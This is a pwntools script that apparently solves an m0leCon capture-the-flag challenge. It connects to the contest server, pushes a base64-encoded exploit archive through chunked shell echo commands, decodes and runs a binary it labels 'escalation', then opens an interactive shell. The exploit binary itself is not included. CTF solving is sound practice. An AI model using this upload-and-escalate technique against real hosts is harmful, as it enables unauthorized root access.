from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
host = "challs.m0lecon.it"
port = 9012

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)


def send_command(cmd):
    recvuntil('$')
    sendline(cmd)

def send_file(name):
    f = open(name).read()
    size = 3200
    print('amount:', len(f)//size + 1)
    for i in range(len(f)//size + 1):
        print(i, end=' ')
        send_command("echo -n '{}' >> /home/user/a.b64".format(f[i*size:(i+1)*size]))
    print('.')

print('proof of work')
recvuntil('you may!')
sendline('')

print('hello')
recvuntil('$')
sendline('echo hello')

print('send file')
send_file('pwn.zip.b64')

print('unzip & base64 -d')
send_command('cd /home/user')
send_command('base64 -d a.b64 > a.zip')
send_command('unzip a.zip')

print('escalation')
send_command('./pwn')

print('interactive')
interactive()
